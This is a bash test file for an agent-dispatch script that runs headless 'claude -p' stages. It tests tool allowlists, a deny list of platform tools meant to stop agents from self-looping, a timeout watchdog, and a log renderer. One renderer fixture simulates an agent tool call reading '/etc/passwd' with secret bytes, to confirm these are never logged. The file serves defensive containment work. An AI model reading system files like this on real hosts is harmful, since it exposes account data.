#!/usr/bin/env bash
# Tests for dispatch.sh.
#
# Group 1 (ENG-41 T7): allowed-tools-linear-mcp — verify no stage's allowed-tools
#   list includes mcp__*linear* tool names (A-002 assumption).
# Group 2 (ENG-41 T7): PIPELINE_WRITER env-propagation — verify dispatch.sh
#   overrides parent PIPELINE_WRITER to "agent" when invoking claude -p
#   (A-003 assumption).
# Group 3 (ENG-26 Task 5 / brainstorm D-002): _render_and_capture_stream
#   stream-json renderer fixtures A-E. See block comments above each fixture.

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

export PIPELINE_DRY_RUN=1
: "${LINEAR_API_KEY:=test-mock-key}"
export LINEAR_API_KEY
export PROJECT_SLUG="${PROJECT_SLUG:-test-slug}"

# ─── Temp dirs ──────────────────────────────────────────────────────────
_TEST_TARGET_DIR="$(mktemp -d)"
_TEST_STUB_DIR="$(mktemp -d)"

_test_assert_temp_path() {
  case "$1" in
    /var/folders/*|/tmp/*|/private/var/folders/*|/private/tmp/*) return 0 ;;
    *) printf 'REFUSING: path %q is not a platform temp dir\n' "$1" >&2; exit 99 ;;
  esac
}
_test_assert_temp_path "$_TEST_TARGET_DIR"
_test_assert_temp_path "$_TEST_STUB_DIR"

_test_safe_rm() {
  local path="$1"
  case "$path" in
    /var/folders/*|/tmp/*|/private/var/folders/*|/private/tmp/*)
      rm -rf "$path" ;;
    *)
      printf 'SAFETY: trap refusing rm -rf %q (not a temp dir)\n' "$path" >&2 ;;
  esac
}
trap '_test_safe_rm "$_TEST_STUB_DIR"; _test_safe_rm "$_TEST_TARGET_DIR"' EXIT

# ─── Minimal target-repo scaffold ────────────────────────────────────────
export TARGET_REPO="$_TEST_TARGET_DIR"
mkdir -p "$TARGET_REPO/.pipeline-config/schemas"

jq -n '{
  project: { slug: "test-slug" },
  linear: {
    team_id: "team-test",
    project_id: "proj-test",
    stage_label_prefix: "stage:",
    native_states: { inbox: "Todo", active: "In Progress", done: "Done" },
    workflow_stages: ["brainstorming","planning","implementing","ui","reviewing","qa","building","released"]
  },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5 }
}' > "$TARGET_REPO/.pipeline-config/config.json"

jq -n '{ labels: {}, states: {} }' > "$TARGET_REPO/.pipeline-config/schemas/linear-ids.json"

export HARNESS_STATE_DIR="$_TEST_STUB_DIR/state"
export PROJECT_STATE_DIR="${HARNESS_STATE_DIR}/${PROJECT_SLUG}"
mkdir -p "$PROJECT_STATE_DIR"
ISSUE_DIR="${PROJECT_STATE_DIR}/ENG-T-COST"
mkdir -p "$ISSUE_DIR"

# ─── Source dispatch.sh (no main due to sentinel) ────────────────────────
# shellcheck source=dispatch.sh
source "$SCRIPT_DIR/dispatch.sh"

# ─── Assertion helpers ───────────────────────────────────────────────────
PASS=0; FAIL=0
fail_at() { printf '  FAIL %s\n      %s\n' "$1" "$2" >&2; FAIL=$((FAIL+1)); }
pass_at() { printf '  PASS %s\n' "$1"; PASS=$((PASS+1)); }

# ─── Group 1: allowed-tools exclude Linear MCP ──────────────────────────
printf '\n--- allowed-tools: no mcp__*linear* in any stage ---\n'

for stage in brainstorming planning implementing ui reviewing qa building released; do
  tools="$(allowed_tools_for "$stage" 2>/dev/null)"
  # Check for any mcp__*linear* substring (case-insensitive match for safety)
  if printf '%s' "$tools" | grep -qi 'mcp__.*linear'; then
    fail_at "stage=$stage: allowed-tools must not include mcp__*linear* tools" \
      "found: $(printf '%s' "$tools" | grep -oi 'mcp__[^,]*linear[^,]*' || true)"
  else
    pass_at "stage=$stage: no mcp__*linear* in allowed-tools"
  fi

  # Both linear.sh paths must be present so harness-self (bin/) and
  # target-symlinked (.pipeline/bin/) layouts both work.
  if ! printf '%s' "$tools" | grep -q 'Bash(bash \.pipeline/bin/linear\.sh:\*)'; then
    fail_at "stage=$stage: missing Bash(bash .pipeline/bin/linear.sh:*) in allowed-tools" \
      "tools=$tools"
  elif ! printf '%s' "$tools" | grep -q 'Bash(bash bin/linear\.sh:\*)'; then
    fail_at "stage=$stage: missing Bash(bash bin/linear.sh:*) in allowed-tools" \
      "tools=$tools"
  else
    pass_at "stage=$stage: both linear.sh paths present (.pipeline/ + harness-self)"
  fi
done

# ENG-49 Gap #1: UI allowlist no longer contains gh pr create.
ui_tools="$(allowed_tools_for ui)"
if [[ "$ui_tools" != *"gh pr create"* ]]; then
  pass_at "ENG-49: ui allowlist drops gh pr create"
else
  fail_at "ENG-49: ui allowlist drops gh pr create" "ui tools: $ui_tools"
fi

# ─── Group 2: PIPELINE_WRITER env propagation ───────────────────────────
printf '\n--- PIPELINE_WRITER=agent propagated to claude -p invocation ---\n'

# Create a stub for 'claude' that captures its environment AND its argv.
ENV_CAPTURE="$_TEST_STUB_DIR/env.capture"
ARGV_CAPTURE="$_TEST_STUB_DIR/argv.capture"
: > "$ENV_CAPTURE"
: > "$ARGV_CAPTURE"

cat > "$_TEST_STUB_DIR/claude" <<SH
#!/usr/bin/env bash
# Stub: capture PIPELINE_WRITER from the environment, capture argv (one arg
# per line) for ENG-48 isolation-flag assertions, then exit 0.
printf 'PIPELINE_WRITER=%s\n' "\${PIPELINE_WRITER:-<unset>}" >> "$ENV_CAPTURE"
printf '%s\n' "\$@" > "$ARGV_CAPTURE"
# Consume stdin (like real claude would) so the caller's pipe doesn't break.
cat > /dev/null
exit 0
SH
chmod +x "$_TEST_STUB_DIR/claude"

# ENG-48 watchdog: the production cmd wraps claude with `gtimeout
# --signal=TERM --kill-after=10 <seconds> claude ...`. Provide a thin
# pass-through stub so the existing claude stub still receives the inner
# argv unchanged for Group 2 / Group 4 assertions.
cat > "$_TEST_STUB_DIR/gtimeout" <<'SH'
#!/usr/bin/env bash
# Skip --signal=…, --kill-after=… flags, then the seconds arg, then exec
# the inner command.
while (( $# > 0 )); do
  case "$1" in
    --signal=*|--kill-after=*) shift ;;
    *) break ;;
  esac
done
# Next arg is the timeout in seconds — eat it.
if [[ "${1:-}" =~ ^[0-9]+$ ]]; then shift; fi
exec "$@"
SH
chmod +x "$_TEST_STUB_DIR/gtimeout"

# Create a minimal prompt file.
_PROMPT_FILE="$_TEST_STUB_DIR/test-prompt.txt"
printf 'test prompt\n' > "$_PROMPT_FILE"

# Override PATH so our stub 'claude' is found first.
# Also set PIPELINE_WRITER to a value that must NOT propagate — dispatch.sh
# must override it to "agent" before invoking claude.
OLD_PATH="$PATH"
export PATH="$_TEST_STUB_DIR:$PATH"

# Set a canary value in the parent; dispatch.sh must override it.
export PIPELINE_WRITER="canary-parent-lane"

# Run dispatch main in a subshell to isolate mutex and PATH side effects.
# Set PIPELINE_DRY_RUN=0 (not unset) so dispatch.sh's [[ "$PIPELINE_DRY_RUN" == "1" ]]
# check works correctly under set -euo pipefail without triggering the unbound-var guard.
# Suppress the "dispatching stage=..." log line.
( PIPELINE_DRY_RUN=0 PIPELINE_WRITER="canary-parent-lane" main "brainstorm" "$_PROMPT_FILE" 2>/dev/null ) || true

export PATH="$OLD_PATH"

# Check what PIPELINE_WRITER value the stub saw.
if [[ -f "$ENV_CAPTURE" ]]; then
  captured_val="$(grep '^PIPELINE_WRITER=' "$ENV_CAPTURE" | head -1 | cut -d= -f2 || true)"
else
  captured_val=""
fi

if [[ "$captured_val" == "agent" ]]; then
  pass_at "PIPELINE_WRITER=agent was set in claude -p environment (parent had 'canary-parent-lane')"
else
  fail_at "PIPELINE_WRITER=agent was set in claude -p environment" \
    "claude saw PIPELINE_WRITER='${captured_val:-<nothing captured>}' (parent had 'canary-parent-lane')"
fi

# ─── Group 4 (ENG-48): isolation flags reach claude -p invocation ────────
# A 2026-04-28 wedged tick traced to the operator's superpowers plugin's
# SessionStart hook firing inside `claude -p`. Headless dispatches must
# neutralize user-level config:
#   --setting-sources project,local  → skip ~/.claude (plugins, hooks)
#   --disable-slash-commands         → block skill auto-load
#   --disallowed-tools <list>        → deny platform tools that aren't
#                                       in any stage's allowed-tools list
#                                       and whose call would let the agent
#                                       self-loop (ScheduleWakeup), self-
#                                       coordinate (TodoWrite), enter plan
#                                       mode (EnterPlanMode), etc.
# This group asserts the constructed claude argv carries those flags,
# using the argv capture seeded by the stub above.
printf '\n--- ENG-48: isolation flags reach claude -p invocation ---\n'

# --setting-sources project,local
if grep -Fxq -- '--setting-sources' "$ARGV_CAPTURE" \
   && grep -Fxq -- 'project,local' "$ARGV_CAPTURE"; then
  pass_at "--setting-sources project,local present in claude argv"
else
  fail_at "--setting-sources project,local missing from claude argv" \
    "argv: $(tr '\n' ' ' < "$ARGV_CAPTURE")"
fi

# --disable-slash-commands
if grep -Fxq -- '--disable-slash-commands' "$ARGV_CAPTURE"; then
  pass_at "--disable-slash-commands present in claude argv"
else
  fail_at "--disable-slash-commands missing from claude argv" \
    "argv: $(tr '\n' ' ' < "$ARGV_CAPTURE")"
fi

# --disallowed-tools must list every platform tool that demonstrated or
# could enable a runaway in a headless dispatch. The value follows the
# flag as the next arg.
disallowed_idx="$(grep -nFx -- '--disallowed-tools' "$ARGV_CAPTURE" | head -1 | cut -d: -f1 || true)"
if [[ -z "$disallowed_idx" ]]; then
  fail_at "--disallowed-tools flag missing from claude argv" \
    "argv: $(tr '\n' ' ' < "$ARGV_CAPTURE")"
else
  disallowed_value="$(sed -n "$((disallowed_idx + 1))p" "$ARGV_CAPTURE")"
  # Task / WebFetch deliberately excluded: Task may alias the Agent tool
  # used by ui/review/qa/retrospective stages, and brainstorm's allowed-
  # tools includes WebFetch. Denials win over allows in claude's tool-
  # resolution.
  required_denies=(
    ScheduleWakeup TodoWrite Skill
    EnterPlanMode ExitPlanMode EnterWorktree ExitWorktree
    RemoteTrigger PushNotification
    CronCreate CronDelete CronList Monitor
    WebSearch ToolSearch AskUserQuestion
  )
  missing_denies=()
  for required in "${required_denies[@]}"; do
    grep -qw -- "$required" <<<"$disallowed_value" || missing_denies+=("$required")
  done
  if (( ${#missing_denies[@]} == 0 )); then
    pass_at "--disallowed-tools denies all required platform tools (${#required_denies[@]} entries)"
  else
    fail_at "--disallowed-tools missing required denies" \
      "missing: ${missing_denies[*]} | value: $disallowed_value"
  fi
fi

# Regression: --allowed-tools must STILL appear (the existing per-stage
# allowlist contract from Group 1 must not be silently dropped during
# the isolation-flag refactor).
if grep -Fxq -- '--allowed-tools' "$ARGV_CAPTURE"; then
  pass_at "--allowed-tools regression: per-stage allowlist contract preserved"
else
  fail_at "--allowed-tools regression: flag dropped from claude argv" \
    "argv: $(tr '\n' ' ' < "$ARGV_CAPTURE")"
fi

# ─── Group 5 (ENG-48): wall-clock watchdog wraps claude -p ──────────────
# A dispatch that enters a self-loop (e.g. ScheduleWakeup re-firing) must
# be SIGTERM'd by the orchestrator within a bounded budget — operator
# intervention should never be required to free the run-local lock. The
# wrapper is `gtimeout` (GNU coreutils on macOS via brew); the budget is
# read from config.json::orchestrator.dispatch_timeout_minutes (default
# 30 min = 1800s). The dispatched cmd's exit 124 (gtimeout's SIGTERM
# convention) will be mapped by failure_outcome_for_exit in a separate
# commit.
printf '\n--- ENG-48: gtimeout watchdog wraps claude -p ---\n'

DRYRUN_OUT="$_TEST_STUB_DIR/dryrun.out"
PIPELINE_DRY_RUN=1 \
  bash "$SCRIPT_DIR/dispatch.sh" brainstorming "$_PROMPT_FILE" 2>"$DRYRUN_OUT" >/dev/null || true

# ENG-65: brainstorming/planning have a 60-min built-in default; other stages
# stay at the historical 30-min cap. No config overrides → 3600s for brainstorm.
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT"; then
  pass_at "dry-run log: gtimeout wrapper with brainstorming built-in default (60-min / 3600s)"
else
  fail_at "dry-run log missing gtimeout wrapper or brainstorming built-in default" \
    "log: $(cat "$DRYRUN_OUT")"
fi

# --signal=TERM and --kill-after=10 must both be present so the wrapper
# escalates from SIGTERM to SIGKILL after 10s if the dispatched claude
# refuses to exit (defensive escalation, not the common case).
if grep -qE 'gtimeout.*--signal=TERM' "$DRYRUN_OUT" \
   && grep -qE 'gtimeout.*--kill-after=10' "$DRYRUN_OUT"; then
  pass_at "dry-run log: gtimeout uses --signal=TERM --kill-after=10 escalation"
else
  fail_at "dry-run log missing gtimeout signal/kill-after escalation flags" \
    "log: $(cat "$DRYRUN_OUT")"
fi

# Custom budget — when orchestrator.dispatch_timeout_minutes is overridden
# (e.g. to 5 for a stage that legitimately runs short), the wrapper
# picks it up.
TARGET_REPO_CUSTOM="$_TEST_STUB_DIR/target-custom"
mkdir -p "$TARGET_REPO_CUSTOM/.pipeline-config/schemas"
jq -n '{
  project: { slug: "custom-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes: 5 }
}' > "$TARGET_REPO_CUSTOM/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_CUSTOM/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_C="$_TEST_STUB_DIR/dryrun-custom.out"
PIPELINE_DRY_RUN=1 \
TARGET_REPO="$TARGET_REPO_CUSTOM" \
PROJECT_SLUG="custom-slug" \
HARNESS_STATE_DIR="$HARNESS_STATE_DIR" \
PROJECT_STATE_DIR="$HARNESS_STATE_DIR/custom-slug" \
LINEAR_API_KEY="$LINEAR_API_KEY" \
  bash "$SCRIPT_DIR/dispatch.sh" brainstorming "$_PROMPT_FILE" 2>"$DRYRUN_OUT_C" >/dev/null || true

if grep -qE 'gtimeout.*\b300\b' "$DRYRUN_OUT_C"; then
  pass_at "dry-run log honors config orchestrator.dispatch_timeout_minutes=5 (300s)"
else
  fail_at "dry-run log did not pick up custom dispatch_timeout_minutes" \
    "log: $(cat "$DRYRUN_OUT_C")"
fi

# ─── ENG-65 per-stage timeout fixtures ────────────────────────────────────
# D-002: a per-stage override beats the global, mis-keyed/zero entries fall
# through to the per-stage built-in default, and built-in defaults are 60-min
# for brainstorming/planning and 30-min for everything else.

_eng65_run_dispatch_dryrun() {
  # $1 = target_repo, $2 = project_slug, $3 = stage, $4 = output file
  local _t="$1" _slug="$2" _stage="$3" _out="$4"
  PIPELINE_DRY_RUN=1 \
  TARGET_REPO="$_t" \
  PROJECT_SLUG="$_slug" \
  HARNESS_STATE_DIR="$HARNESS_STATE_DIR" \
  PROJECT_STATE_DIR="$HARNESS_STATE_DIR/$_slug" \
  LINEAR_API_KEY="$LINEAR_API_KEY" \
    bash "$SCRIPT_DIR/dispatch.sh" "$_stage" "$_PROMPT_FILE" 2>"$_out" >/dev/null || true
}

# Per-stage override fixture — brainstorming gets 45 min (2700s), other stages
# unaffected (ui still uses its 30-min built-in default = 1800s).
TARGET_REPO_PERSTAGE="$_TEST_STUB_DIR/target-perstage"
mkdir -p "$TARGET_REPO_PERSTAGE/.pipeline-config/schemas"
jq -n '{
  project: { slug: "perstage-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorming: 45 } }
}' > "$TARGET_REPO_PERSTAGE/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_PERSTAGE/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_PS_BS="$_TEST_STUB_DIR/dryrun-perstage-bs.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_PERSTAGE" "perstage-slug" brainstorming "$DRYRUN_OUT_PS_BS"
if grep -qE 'gtimeout.*\b2700\b' "$DRYRUN_OUT_PS_BS"; then
  pass_at "ENG-65 per-stage override: brainstorming honors dispatch_timeout_minutes_per_stage=45 (2700s)"
else
  fail_at "ENG-65 per-stage override did not apply to brainstorming" \
    "log: $(cat "$DRYRUN_OUT_PS_BS")"
fi

DRYRUN_OUT_PS_UI="$_TEST_STUB_DIR/dryrun-perstage-ui.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_PERSTAGE" "perstage-slug" ui "$DRYRUN_OUT_PS_UI"
if grep -qE 'gtimeout.*\b1800\b' "$DRYRUN_OUT_PS_UI"; then
  pass_at "ENG-65 per-stage override: ui untouched by brainstorming override (1800s built-in default)"
else
  fail_at "ENG-65 per-stage override leaked into ui" \
    "log: $(cat "$DRYRUN_OUT_PS_UI")"
fi

# Fallthrough fixture — no per-stage map, but global override is 5 min (300s).
TARGET_REPO_FT="$_TEST_STUB_DIR/target-fallthrough"
mkdir -p "$TARGET_REPO_FT/.pipeline-config/schemas"
jq -n '{
  project: { slug: "ft-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes: 5 }
}' > "$TARGET_REPO_FT/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_FT/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_FT="$_TEST_STUB_DIR/dryrun-ft.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_FT" "ft-slug" brainstorming "$DRYRUN_OUT_FT"
if grep -qE 'gtimeout.*\b300\b' "$DRYRUN_OUT_FT"; then
  pass_at "ENG-65 fallthrough: brainstorming uses global dispatch_timeout_minutes=5 when per-stage absent (300s)"
else
  fail_at "ENG-65 fallthrough did not pick up global override" \
    "log: $(cat "$DRYRUN_OUT_FT")"
fi

# Built-in-default-by-stage fixture — no overrides at all; brainstorming and
# planning land at 60 min (3600s); ui/implementing/qa land at 30 min (1800s).
TARGET_REPO_BI="$_TEST_STUB_DIR/target-builtin"
mkdir -p "$TARGET_REPO_BI/.pipeline-config/schemas"
jq -n '{
  project: { slug: "bi-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5 }
}' > "$TARGET_REPO_BI/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_BI/.pipeline-config/schemas/linear-ids.json"

for stage in brainstorming planning; do
  out="$_TEST_STUB_DIR/dryrun-bi-$stage.out"
  _eng65_run_dispatch_dryrun "$TARGET_REPO_BI" "bi-slug" "$stage" "$out"
  if grep -qE 'gtimeout.*\b3600\b' "$out"; then
    pass_at "ENG-65 built-in default: $stage uses 60-min (3600s) when no overrides set"
  else
    fail_at "ENG-65 built-in default for $stage" "log: $(cat "$out")"
  fi
done

for stage in ui implementing qa; do
  out="$_TEST_STUB_DIR/dryrun-bi-$stage.out"
  _eng65_run_dispatch_dryrun "$TARGET_REPO_BI" "bi-slug" "$stage" "$out"
  if grep -qE 'gtimeout.*\b1800\b' "$out"; then
    pass_at "ENG-65 built-in default: $stage uses 30-min (1800s) when no overrides set"
  else
    fail_at "ENG-65 built-in default for $stage" "log: $(cat "$out")"
  fi
done

# Zero-rejection fixture — `dispatch_timeout_minutes_per_stage.brainstorming = 0`
# would disable the gtimeout watchdog (gtimeout's "no timeout" sentinel).
# The (( minutes >= 1 )) guard restores the per-stage built-in default.
TARGET_REPO_ZERO="$_TEST_STUB_DIR/target-zero"
mkdir -p "$TARGET_REPO_ZERO/.pipeline-config/schemas"
jq -n '{
  project: { slug: "zero-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorming: 0 } }
}' > "$TARGET_REPO_ZERO/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_ZERO/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_ZERO="$_TEST_STUB_DIR/dryrun-zero.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_ZERO" "zero-slug" brainstorming "$DRYRUN_OUT_ZERO"
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT_ZERO" \
   && ! grep -qE 'gtimeout.*\b0\b' "$DRYRUN_OUT_ZERO"; then
  pass_at "ENG-65 zero-rejection: brainstorming with per-stage=0 falls back to 60-min built-in (3600s, NOT 0)"
else
  fail_at "ENG-65 zero-rejection failed (watchdog would be disabled)" \
    "log: $(cat "$DRYRUN_OUT_ZERO")"
fi

# Typo'd-key fixture — `brainstorm` (missing -ing) silently falls through to
# the per-stage built-in default. Documented behavior so operators learn to
# verify `gtimeout ... <seconds>` in the per-stage transcript after applying
# their override.
TARGET_REPO_TYPO="$_TEST_STUB_DIR/target-typo"
mkdir -p "$TARGET_REPO_TYPO/.pipeline-config/schemas"
jq -n '{
  project: { slug: "typo-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorm: 45 } }
}' > "$TARGET_REPO_TYPO/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_TYPO/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_TYPO="$_TEST_STUB_DIR/dryrun-typo.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_TYPO" "typo-slug" brainstorming "$DRYRUN_OUT_TYPO"
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT_TYPO"; then
  pass_at "ENG-65 typo'd-key: brainstorming ignores 'brainstorm' (missing -ing) → 60-min built-in (3600s)"
else
  fail_at "ENG-65 typo'd-key did not fall through to built-in default" \
    "log: $(cat "$DRYRUN_OUT_TYPO")"
fi

# Non-numeric override (string "60m" instead of 60) — regex guard rejects, so
# the value falls through to the global, then to the per-stage built-in.
TARGET_REPO_NN="$_TEST_STUB_DIR/target-nonnumeric"
mkdir -p "$TARGET_REPO_NN/.pipeline-config/schemas"
jq -n '{
  project: { slug: "nn-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorming: "60m" } }
}' > "$TARGET_REPO_NN/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_NN/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_NN="$_TEST_STUB_DIR/dryrun-nonnumeric.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_NN" "nn-slug" brainstorming "$DRYRUN_OUT_NN"
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT_NN"; then
  pass_at "ENG-65 non-numeric: \"60m\" string rejected; falls through to 60-min built-in (3600s)"
else
  fail_at "ENG-65 non-numeric did not fall through" \
    "log: $(cat "$DRYRUN_OUT_NN")"
fi

# ─── Group 5 (ENG-103): --model argv splice ─────────────────────────────
# PIPELINE_DISPATCH_MODEL is the env-var hand-off from run-stage.sh. When
# non-empty, dispatch.sh splices `--model <value>` into both the claude -p
# argv (production path) and the DRY_RUN log line (operator audit trail).
# When empty/unset, the flag is omitted so claude uses the subscription
# default — preserving today's behavior on hosts that invoke dispatch.sh
# outside of run-stage.sh (e.g. mutex-test).
printf '\n--- ENG-103: --model splice in DRY_RUN log ---\n'

DRYRUN_OUT_M="$_TEST_STUB_DIR/dryrun-model.out"
PIPELINE_DRY_RUN=1 \
PIPELINE_DISPATCH_MODEL=claude-sonnet-4-6 \
  bash "$SCRIPT_DIR/dispatch.sh" implementing "$_PROMPT_FILE" 2>"$DRYRUN_OUT_M" >/dev/null || true

if grep -qE -- '--model claude-sonnet-4-6' "$DRYRUN_OUT_M"; then
  pass_at "ENG-103: PIPELINE_DISPATCH_MODEL=claude-sonnet-4-6 splices --model into DRY_RUN log"
else
  fail_at "ENG-103: --model splice missing from DRY_RUN log" \
    "log: $(cat "$DRYRUN_OUT_M")"
fi

DRYRUN_OUT_MU="$_TEST_STUB_DIR/dryrun-model-unset.out"
PIPELINE_DRY_RUN=1 \
PIPELINE_DISPATCH_MODEL="" \
  bash "$SCRIPT_DIR/dispatch.sh" implementing "$_PROMPT_FILE" 2>"$DRYRUN_OUT_MU" >/dev/null || true

if ! grep -qE -- '--model ' "$DRYRUN_OUT_MU"; then
  pass_at "ENG-103: PIPELINE_DISPATCH_MODEL empty omits --model from DRY_RUN log"
else
  fail_at "ENG-103: --model leaked into DRY_RUN log when env var empty" \
    "log: $(cat "$DRYRUN_OUT_MU")"
fi

# ─── Group 3: stream-json renderer fixtures (ENG-26 Task 5) ──────────────
# Five fixtures:
#   A — success path: NDJSON with a final `result` event yields the six-field
#       usage file at mode 0600, with no leaked session_id / result text.
#   B — no-result path: NDJSON ends mid-stream; no usage file, soft-fail log.
#   C — malformed-line tolerance: a literal `{not json{` between valid events
#       does not abort the renderer; the result event is still extracted.
#   D — log-forge defense: a `\r[FAKE LOG]` byte in agent text is stripped
#       to a space before reaching renderer stdout (SEC-010).
#   E — dry-run stale-file removal: a pre-existing usage file is removed by
#       the dry-run branch's `rm -f` at function entry (E-04 / D-006).

printf '\n--- _render_and_capture_stream renderer fixtures (A-E) ---\n'

if ! declare -f _render_and_capture_stream >/dev/null 2>&1; then
  fail_at "precondition: _render_and_capture_stream is defined in dispatch.sh" \
          "function not found after sourcing — Task 2 implementation missing"
  printf '\nRESULTS: %d passed, %d failed\n' "$PASS" "$FAIL"
  exit 1
fi

# Renderer needs PIPELINE_DRY_RUN=0 so it actually exercises the code path
# (the dry-run guard short-circuits dispatch::main before the renderer).
PIPELINE_DRY_RUN=0
export PIPELINE_DRY_RUN

# ─── Fixture A: success path ───────────────────────────────────────────────
USAGE_A="$ISSUE_DIR/usage-plan.json"
RAW_A="$ISSUE_DIR/.raw-stream.ndjson.tmp"
rm -f "$USAGE_A" "$RAW_A"
RENDER_OUT_A="$(
  _render_and_capture_stream "$USAGE_A" "$ISSUE_DIR" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"a97ddba2-aaaa-bbbb-cccc-dddddddddddd","model":"claude-opus-4-7[1m]"}
{"type":"assistant","message":{"content":[{"type":"text","text":"hello world"}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Read","input":{"path":"/etc/passwd","SECRET_BYTES":"do-not-log"}}]}}
{"type":"user","message":{"content":[{"type":"tool_result","tool_use_id":"toolu_01abcd1234ef","content":"file contents"}]}}
{"type":"result","total_cost_usd":0.11943025,"usage":{"input_tokens":5,"output_tokens":6,"cache_creation_input_tokens":17419,"cache_read_input_tokens":20773},"modelUsage":{"claude-opus-4-7[1m]":{"inputTokens":5}},"session_id":"a97ddba2-aaaa-bbbb-cccc-dddddddddddd","permission_denials":[],"result":"VERBATIM_FINAL_ASSISTANT_TEXT_DO_NOT_LEAK"}
NDJSON
)"

# Six-field usage file, no leaks.
keys_a="$(jq -r 'keys | sort | join(",")' "$USAGE_A" 2>/dev/null || printf '')"
expected_keys="cache_create,cache_read,cost_usd,model,tokens_in,tokens_out"
mode_a="$(stat -f '%A' "$USAGE_A" 2>/dev/null || stat -c '%a' "$USAGE_A" 2>/dev/null || printf '')"
has_session="$(jq -r 'has("session_id")' "$USAGE_A" 2>/dev/null || printf 'true')"
has_result_text="$(jq -r 'has("result")' "$USAGE_A" 2>/dev/null || printf 'true')"
model_a="$(jq -r '.model' "$USAGE_A" 2>/dev/null || printf '')"

if [[ "$keys_a" == "$expected_keys" ]] \
   && [[ "$mode_a" == "600" ]] \
   && [[ "$has_session" == "false" ]] \
   && [[ "$has_result_text" == "false" ]] \
   && [[ "$model_a" == "claude-opus-4-7[1m]" ]]; then
  pass_at "fixture-A success: six fields, mode 600, no session_id/result leak, model literal preserved"
else
  fail_at "fixture-A success" "keys=$keys_a mode=$mode_a session=$has_session result=$has_result_text model=$model_a"
fi

# Renderer stdout shape — prose lines must NOT be JSON-quoted (jq -r contract).
# Each non-empty line must not begin with a `"` (which is what would happen
# if `jq -nR` ran without `-r`).
prose_unquoted="yes"
while IFS= read -r line; do
  [[ -z "$line" ]] && continue
  if [[ "${line:0:1}" == '"' ]]; then
    prose_unquoted="no:$line"
    break
  fi
done <<<"$RENDER_OUT_A"

if   [[ "$prose_unquoted" == "yes" ]] \
  && grep -q '\[claude\] session=a97ddba2'      <<<"$RENDER_OUT_A" \
  && grep -q 'hello world'                       <<<"$RENDER_OUT_A" \
  && grep -q '\[tool\] Read'                     <<<"$RENDER_OUT_A" \
  && grep -q '\[tool-result\]'                   <<<"$RENDER_OUT_A" \
  && ! grep -q 'SECRET_BYTES'                    <<<"$RENDER_OUT_A" \
  && ! grep -q 'do-not-log'                      <<<"$RENDER_OUT_A" \
  && ! grep -q 'VERBATIM_FINAL_ASSISTANT_TEXT'   <<<"$RENDER_OUT_A"; then
  pass_at "fixture-A stdout: prose lines emitted unquoted, tool_use input bytes never logged (SEC-001)"
else
  fail_at "fixture-A stdout" "unquoted=$prose_unquoted out=$RENDER_OUT_A"
fi

# Renderer stdout shape — raw vs JSON-quoted (D-002 / F3 contract).
# `jq -n` without `-r` emits string outputs as JSON-encoded values, so
# `[claude] session=...` becomes `"[claude] session=..."` (literal
# surrounding double-quote bytes) on stdout. The downstream
# `tee "$log_file"` then captures JSON-quoted prose, breaking the
# brainstorm's "prose-ish progress lines on STDOUT" contract.
# Catch the regression by asserting no prose line begins with `"`.
